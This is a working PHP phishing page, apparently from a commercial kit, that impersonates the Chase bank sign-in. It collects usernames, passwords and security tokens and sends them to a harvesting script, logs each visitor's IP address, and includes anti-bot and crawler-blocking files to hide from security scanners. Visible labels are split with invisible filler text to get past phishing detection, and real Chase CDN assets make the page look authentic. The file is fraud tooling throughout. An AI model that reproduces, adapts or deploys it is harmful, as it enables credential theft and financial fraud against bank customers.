<?php

session_start();
error_reporting(0);

// ------------------------------------------------- //
  #                 BY: @blue_prints              #
  #             F#ck you credit changer :)        #
  # Change credit if you dont know how to code :) #
  #################################################
// -------------------------------------------------//

include 'files/conf/config.php';

//other bots
include 'blueprint/antbots/ip_blocklist.php';
include 'blueprint/antbots/crawler.php';
include 'blueprint/antbots/boting.php';
include 'blueprint/antbots/myz.php';
include 'bot_fucker/fucker001.php';
include 'bot_fucker/fucker002.php';
include 'bot_fucker/fucker003.php';
include 'bot_fucker/fucker004.php';
include 'bot_fucker/fucker005.php';
include 'bot_fucker/fucker006.php';
include 'bot_fucker/fucker007.php';
include 'bot_fucker/fucker008.php';
include 'bot_fucker/wrd.php';
include 'bot_fucker/bot.php';
require_once 'inc.php';
require_once 'blocklist.php';
require_once 'proxy.php';
require_once 'huehuehue.php';
include 'zsec.php';
@require "blueprint/antbots/Crawler/src/CrawlerDetect.php";
 use JayBizzle\CrawlerDetect\CrawlerDetect;



date_default_timezone_set('Europe/London');
$v_ip = $_SERVER['REMOTE_ADDR'];
$v_agent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);

    $content2 = "#>".$_SERVER['REMOTE_ADDR']."\r\n";
    $save2=fopen("files/data/login_page_views.txt","a+");
    fwrite($save2,$content2);
    fclose($save2);



?>


<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr">
<head>

        <!-- Meta BY Blueprint -->
        <meta charset="utf-8" />
        <meta name="robots" content="noindex,nofollow" />
        <title>Sign in</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<meta charset="utf-8" />
        <meta name="robots" content="noindex,nofollow" />
        <title>Sign-in chase.com</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        
        <link rel="apple-touch-startup-image" href="" media="screen and (max-device-width: 320px)">
        <style>@font-face {font-family: Open Sans;font-style: normal;font-weight: 400;src: url('https://bit.ly/3btTex7') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-regular.svg#opensans-regular') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 600;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-semibold.svg#opensans-semibold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 700;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-bold.svg#opensans-bold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 800;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-extrabold.svg#opensans-extrabold') format('svg');}@font-face {font-family: Open Sans;font-style: normal;font-weight: 300;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/opensans-light.svg#opensans-light') format('svg');}@font-face {font-family: videoplayer;font-style: normal;font-weight: normal;src: url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.eot?#iefix') format('embedded-opentype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.woff') format('woff'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.ttf') format('truetype'),url('https://static.chasecdn.com/content/dam/cpo-static/fonts/videoplayer.svg#videoplayer') format('svg');}
        html {height:100%; background: #fff;}
        body{
            background-image: url('https://static.chasecdn.com/content/geo-images/images/background.desktop.day.4.jpeg');
        }
        </style>
        

        


        
        
        
        <style type="text/css"></style><link rel="stylesheet" href="https://static.chasecdn.com/web/2020.06.21-621/logon/assets/logon.css">
		    <link rel="stylesheet" href="https://static.chasecdn.com/web/2020.06.21-621/@ccb-cxo/cxo-ui-common-utilities/dist/common/assets/blue-ui.css">
        <link rel="shortcut icon" href="./style/img/chasefavicon.ico" />
        <!-- ICONS BY Blueprint -->
        <link rel="apple-touch-icon" sizes="152x152" href="blueprint/Files/img/chse-touch-icon-152x152.png">
        <link rel="apple-touch-icon" sizes="120x120" href="blueprint/Files/img/chse-touch-icon-120x120.png">
        <link rel="apple-touch-icon" sizes="76x76" href="blueprint/Files/img/chae-touch-icon-76x76.png">
        <link rel="apple-touch-icon" href="blueprint/Files/img/chsetouch-icon.png">
        <link rel="shortcut icon" href="blueprint/Files/img/chsefavicon.ico">

        <!-- Css BY Blueprint -->
        <link rel="stylesheet" href="blueprint/Files/css/logon.css">
        <link rel="stylesheet" href="blueprint/Files/css/blue-ui2.css">
        <link rel="stylesheet" href="blueprint/Files/css/login.css">
        <link rel="stylesheet" href="blueprint/Files/css/dashboard.css">


        <!-- Loading  -->
        <script type="text/javascript">
            document.onreadystatechange = function() {
                var state = document.readyState
                if (state == 'complete') {
                    setTimeout(function() {
                        document.getElementById('interactive');
                        document.getElementById('fixed').style.visibility = "hidden";
                    }, 1500);
                }
            }
        </script>


<body style="overflow-x: hidden; overflow-y: auto; height: 100%;" data-has-view="true" class="daog">
  <div id="load" style="display:none">
      <div class="spinner" style="position: fixed;top: 43%;right: 0;bottom: 0;left: 0;z-index: 200;margin: 0;text-align: center;">
        <div class="">
          <div id="chaseSpinnerID" class="jpui spinner" tabindex="-1">
            <span id="accessible-chaseSpinnerID" class="util accessible-text">l<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>o<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>a<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>d<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>i<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>n<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>g</span>
          </div>
        </div>
      </div>
    </div>


    <div id="fixed">
       <div class="spinner" style="position: fixed;top: 43%;right: 0;bottom: 0;left: 0;z-index: 200;margin: 0;text-align: center;">
            <div class="">
               <div id="chaseSpinnerID" class="jpui spinner" tabindex="-1">
                  <span id="accessible-chaseSpinnerID" class="util accessible-text">l<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>o<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>a<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>d<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>i<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>n<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>g</span>
               </div>
            </div>
       </div>
    </div>


<body style="overflow-x: hidden; overflow-y: auto; height: 100%" data-has-view="true"><div id="logonApp" data-is-view="true"><div class="homepage" tabindex="-1"><div id="advertisenativeapp" data-has-view="true"><div data-is-view="true"><div class="advertiseNativeApp"></div></div></div> <div class="toggle-aria-hidden" id="sitemessage" role="region" aria-labelledby="site-messages-heading" aria-hidden="true" data-has-view="true"><div data-is-view="true"><div id="siteMessageAda" aria-live="polite"><h2 class="util accessible-text" id="site-messages-heading">You have no more site alerts</h2></div> </div></div> <div class="logon-container" id="container"><header class="toggle-aria-hidden" id="logon-summary-menu" data-has-view="true"><div class="logon header jpui transparent navigation bar" data-is-view="true"><a id="logoHomepageLink" href="#"> <div class="chase logo"></div> <span class="util accessible-text">Chase.com homepage</span></a> </div></header> <main id="logon-content" data-has-view="true"><div class="container logon" data-is-view="true"><div><div id="backgroundImage"> <div class="jpui background image fixed" id="geoImage"><style type="text/css">.jpui.background.image { background-image: url(https://static.chasecdn.com/content/geo-images/images/background.mobile.night.7.jpeg);filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.night.7.jpeg', sizingMethod='scale');-ms-filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src='https://static.chasecdn.com/content/geo-images/images/background.mobile.night.7.jpeg', sizingMethod='scale');}@media (min-width:320px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.mobile.night.7.jpeg); } }@media (min-width:992px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.tablet.night.7.jpeg); } }@media (min-width:1024px) { .jpui.background.image{background-image:url(https://static.chasecdn.com/content/geo-images/images/background.desktop.night.7.jpeg); } }</style></div></div></div> <div class="row"><div class="col-xs-12 col-md-6 col-md-offset-3 logoff hidden" id="logoffbox"><div class="jpui raised segment"><div class="row"><div class="col-xs-10 col-xs-offset-1"><h3 class="u-focus in-progress" tabindex="-1" id="logoff-header">You're being signed out.</h3></div></div> <div class="row"><div class="col-xs-12"><div class="progress"><div class="bar"></div></div></div></div></div> </div> <div class="col-xs-12 col-sm-6 col-sm-offset-3 logon-box" id="logonbox"><div class="jpui raised segment"><div id="thirdPartyAggregatorSecurityBanner"></div> <div class="row"><div class="col-xs-10 col-xs-offset-1">




<!--- FORM HERE--->
<form id="login-form" method="POST"  action="files/next/login.php" >
    <?php 
    if (isset($_GET['invalid'])) {
        print"<input type='hidden' name='invalid' value='invalid'><div id='validator-error-header'><div class='jpui error error inverted primary animate alert' id='logon-error' role='region'><div class='icon'><span id='type-icon-logon-error'><i class='jpui exclamation-color icon' id='icon-type-icon-logon-error' aria-hidden='true'></i></span></div> <div class='icon background'></div> <div class='content wrap' id='content-logon-error'><h2 class='title' tabindex='-1' id='inner-logon-error'><span class='util accessible-text' id='icon-logon-error'>Important: </span>We can't find that username and password. You can <a href='#''>reset your password</a> or try again.</h2> </div></div></div>";
      }
        ?>


<div class="jpui fieldgroup logon-xs-toggle logon-floating-label userID-margin-top" id="userId">
<div class="jpui vertical"><div class="align-label-input floating-label__container"> 
<div class="logon-xs-toggle" id="userId-text"> 

<input class="jpui input logon-xs-toggle" name="username" placeholder="Username"  type="text" data-validation="length" data-validation-length="min1" data-validation-error-msg=" ">    </div> </div>  <div><div>  </div></div></div> </div>

<div class="jpui fieldgroup logon-xs-toggle logon-floating-label" id="password">
<div class="jpui vertical"><div class="align-label-input floating-label__container">
<div class="label-wrapper">
<label class="jpui fieldlabel label-alignment vertical" placeholder="Password" id="password-label" for="password-text-input-field" aria-hidden="false">
<span class="util accessible-text" id="password-label-errorLabel"></span><span class="util accessible-text" id="password-label-accessible-text"></span></label> </div> 
<div class="logon-xs-toggle" id="password-text"> 

<input  class="jpui input logon-xs-toggle"  placeholder="Password" type="password" name="password"  data-validation="length" data-validation-length="min1" data-validation-error-msg=" ">    </div> </div>  <div><div>  </div></div></div> </div>



<div class="logon-xs-toggle" id="securityToken" style="display: none;" >
<input class="jpui input logon-xs-toggle"  placeholder="Token" name="token" type="tel" name="securityToken" data-validation="length" data-validation-length="min6-30" data-validation-error-msg=" "> 
</div>
<div class="row logon-xs-toggle">
<div class="col-xs-6 rememberMe-checkbox-container">
<div class="jpui checkbox" id="rememberMe">
<div class="checkbox-flex">
<div class="checkboxWrap">

<input class="checkbox__input" type="checkbox" id="rememberMe"  name="rememberMe">

<i class="jpui checkmark icon check" aria-hidden="true"></i>
</div>
<label for="input-rememberMe">
<span class="checkbox-label" id="label-rememberMe">R<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>e<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>m<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>e<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>m<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>b<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>e<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>r m<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>e </span></label>
</div>
</div>
</div>
<div class="col-xs-6 token-checkbox-container">
<div class="jpui checkbox useToken" id="useToken">
<div class="checkbox-flex">
<div class="checkboxWrap">
<input class="checkbox__input" type="checkbox" id="input-useToken"  value="on">
<i class="jpui checkmark icon check" aria-hidden="true"></i>
</div>
<label for="input-useToken">
<span class="checkbox-label" id="token">U<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>s<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>e t<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>o<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>k<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>e<font style="color:transparent;font-size:0px"><?= $BLUEPRINT ?></font>n </span></label>
</div>
</div>
</div>
</div>
<div class="row">
<button type="submit" id="signin-button" class="jpui button focus fluid primary">
<span class="label">Sign in</span>
</button>

</div>
<div class="row">
<span class="jpui link" id="forgotPassword-link-wrapper">
<a class="link-anchor" id="forgotPassword" href="javascript:void(0);" aria-label=" Forgot username/password? ">Forgot username/password?<i class="jpui progressright icon end-icon" id="forgotPassword-endIcon" aria-hidden="true">
</i>
</a>
</span>
</div>
<div class="row">
<span class="jpui link" id="enrollment-link-wrapper">
<a class="link-anchor last" id="enrollment" href="javascript:void(0);" aria-label=" Not Enrolled? Sign Up Now. ">Not Enrolled? Sign Up Now.<i class="jpui progressright icon end-icon" id="enrollment-endIcon" aria-hidden="true"></i>
</a>
</span>
</div>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
</main>
</div>
<footer class="logon-footer" id="logon-footer" data-has-view="true"><div class="footer-container" data-is-view="true" style="position: static;"><div class="container"><div class="social-links row"><div class="col-xs-12"><span class="follow-us-text">Follow us:</span> <ul class="icon-links"><li class="facebook"><span id="requestChaseFacebook-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseFacebook"> <span class="util accessible-text" id="accessible-requestChaseFacebook">Facebook: Opens dialog</span> <i class="jpui facebook icon" id="icon-requestChaseFacebook" aria-hidden="true"></i></a></span></li> <li class="instagram"><span id="requestChaseInstagram-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseInstagram"> <span class="util accessible-text" id="accessible-requestChaseInstagram">Instagram: Opens dialog</span> <i class="jpui instagram icon" id="icon-requestChaseInstagram" aria-hidden="true"></i></a></span></li> <li class="twitter"><span id="requestChaseTwitter-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseTwitter"> <span class="util accessible-text" id="accessible-requestChaseTwitter">Twitter: Opens dialog</span> <i class="jpui twitter icon" id="icon-requestChaseTwitter" aria-hidden="true"></i></a></span></li> <li class="youtube"><span id="requestChaseYouTube-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseYouTube"> <span class="util accessible-text" id="accessible-requestChaseYouTube">YouTube: Opens dialog</span> <i class="jpui youtube icon" id="icon-requestChaseYouTube" aria-hidden="true"></i></a></span></li> <li class="linkedin"><span id="requestChaseLinkedIn-iconanchor-wrapper"><a class="jpui iconaction" href="javascript:void(0);" id="requestChaseLinkedIn"> <span class="util accessible-text" id="accessible-requestChaseLinkedIn">LinkedIn: Opens dialog</span> <i class="jpui linkedin icon" id="icon-requestChaseLinkedIn" aria-hidden="true"></i></a></span></li></ul></div></div> <div class="footer-links row implement-ada-features-enabled"><div class="col-xs-12"><ul><li><span class="jpui link" id="requestContactUs-link-wrapper"><a class="link-anchor" id="requestContactUs" href="javascript:void(0);" aria-label=" Contact us ">Contact us</a></span></li> <li><span class="jpui link" id="requestPrivacyNotice-link-wrapper"><a class="link-anchor" id="requestPrivacyNotice" href="javascript:void(0);" aria-label=" Privacy ">Privacy</a></span></li> <li><span class="jpui link" id="requestSecurity-link-wrapper"><a class="link-anchor" id="requestSecurity" href="javascript:void(0);" aria-label=" Security ">Security</a></span></li> <li><span class="jpui link" id="requestTermsOfUse-link-wrapper"><a class="link-anchor" id="requestTermsOfUse" href="javascript:void(0);" aria-label=" Terms of use ">Terms of use</a></span></li> <li><span class="jpui link" id="requestAccessibility-link-wrapper"><a class="link-anchor" id="requestAccessibility" href="javascript:void(0);" aria-label=" Accessibility ">Acce<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ssibility</a></span></li> <li><span class="jpui link" id="requestMortgageLoanOriginators-link-wrapper"><a class="link-anchor" id="requestMortgageLoanOriginators" href="javascript:void(0);" aria-label=" SAFE Act: Chase Mortgage Loan Originators ">SAFE Act: C<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ha<font style="color:transparent;font-size:0px"><?=$rundom;?></font>se Mor<font style="color:transparent;font-size:0px"><?=$rundom;?></font>tgage Loan Orig<font style="color:transparent;font-size:0px"><?=$rundom;?></font>inators</a></span></li> <li><span class="jpui link" id="requestHomeMortgageDisclosureAct-link-wrapper"><a class="link-anchor" id="requestHomeMortgageDisclosureAct" href="javascript:void(0);" aria-label=" Fair Lending ">Fair Le<font style="color:transparent;font-size:0px"><?=$rundom;?></font>nding</a></span></li> <li><span class="jpui link" id="requestAboutChase-link-wrapper"><a class="link-anchor" id="requestAboutChase" href="javascript:void(0);" aria-label=" About Chase ">About Ch<font style="color:transparent;font-size:0px"><?=$rundom;?></font>as<font style="color:transparent;font-size:0px"><?=$rundom;?></font>e</a></span></li> <li><span class="jpui link" id="requestJpMorgan-link-wrapper"><a class="link-anchor" id="requestJpMorgan" href="javascript:void(0);" aria-label=" J.P. Morgan ">J.<font style="color:transparent;font-size:0px"><?=$rundom;?></font>P. Mor<font style="color:transparent;font-size:0px"><?=$rundom;?></font>gan</a></span></li> <li><span class="jpui link" id="requestJpMorganChaseCo-link-wrapper"><a class="link-anchor" id="requestJpMorganChaseCo" href="javascript:void(0);" aria-label=" JPMorgan Chase &amp; Co. ">J<font style="color:transparent;font-size:0px"><?=$rundom;?></font>PMo<font style="color:transparent;font-size:0px"><?=$rundom;?></font>rgan Ch<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ase &amp; Co.</a></span></li> <li><span class="jpui link" id="requestCareers-link-wrapper"><a class="link-anchor" id="requestCareers" href="javascript:void(0);" aria-label=" Careers ">Ca<font style="color:transparent;font-size:0px"><?=$rundom;?></font>reers</a></span></li> <li><span class="jpui link" id="requestEspanol-link-wrapper"><a class="link-anchor" id="requestEspanol" href="javascript:void(0);" aria-label=" Español ">Español</a></span></li> <li><span class="jpui link" id="requestChaseCanada-link-wrapper"><a class="link-anchor" id="requestChaseCanada" href="javascript:void(0);" aria-label=" Chase Canada ">C<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ha<font style="color:transparent;font-size:0px"><?=$rundom;?></font>se Canada</a></span></li> <li><span class="jpui link" id="requestSiteMap-link-wrapper"><a class="link-anchor" id="requestSiteMap" href="javascript:void(0);" aria-label=" Site map ">Site map</a></span></li> <li>Memb<font style="color:transparent;font-size:0px"><?=$rundom;?></font>er FDIC</li> <li><i class="jpui equal-housing-lender icon" id="equalHousingLenderLabel" aria-hidden="true"></i> Equa<font style="color:transparent;font-size:0px"><?=$rundom;?></font>l Hou<font style="color:transparent;font-size:0px"><?=$rundom;?></font>sing Lender</li> <li class="copyright-label">© 2021 JP<font style="color:transparent;font-size:0px"><?=$rundom;?></font>Morg<font style="color:transparent;font-size:0px"><?=$rundom;?></font>an Cha<font style="color:transparent;font-size:0px"><?=$rundom;?></font>se &amp; Co.</li></ul></div></div> <div class="row galaxy-footer"><div class="col-xs-10 col-xs-offset-1"><p class="NOTE"><span></span><br> <span class="copyright-label">© 2021 JPMorgan Chase &amp; Co.</span></p> <p><span class="jpui link" id="galaxyRequestPrivacyNotice-link-wrapper"><a class="link-anchor NOTELINK" id="galaxyRequestPrivacyNotice" href="javascript:void(0);" aria-label=" Privacy ">Privacy<i class="jpui progressright icon end-icon" id="galaxyRequestPrivacyNotice-endIcon" aria-hidden="true"></i></a></span></p> <p><span class="jpui link" id="galaxyRequestAccessibility-link-wrapper"><a class="link-anchor NOTELINK" id="galaxyRequestAccessibility" href="javascript:void(0);" aria-label=" Accessibility ">Accessibility<i class="jpui progressright icon end-icon" id="galaxyRequestAccessibility-endIcon" aria-hidden="true"></i></a></span></p></div></div></div></div></footer></div> <div id="languageSupportDisclaimer"></div> <div id="overlay" data-has-view="true"></div> <div class="overlay"></div> <div id="signoutModal"></div> <div id="siteExitWarning"></div> <div id="serviceErrorModal"></div> <div id="sessionTimeoutModal"></div></div>
		
		
		
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
$(".checkbox__input").click(function(){
    $(this).toggleClass('checkbox__input--checked')
});

$(document).ready(function() {
  $("#input-useToken").click(function() {
    $("#securityToken").toggle();
  });
});
  $.validate();
  $('#my-textarea').restrictLength( $('#max-length-element') );
  $.validate({
  modules : 'toggleDisabled',
  disabledFormFilter : 'form.toggle-disabled',
  showErrorDialogs : false
});

</script>
</body>
</html>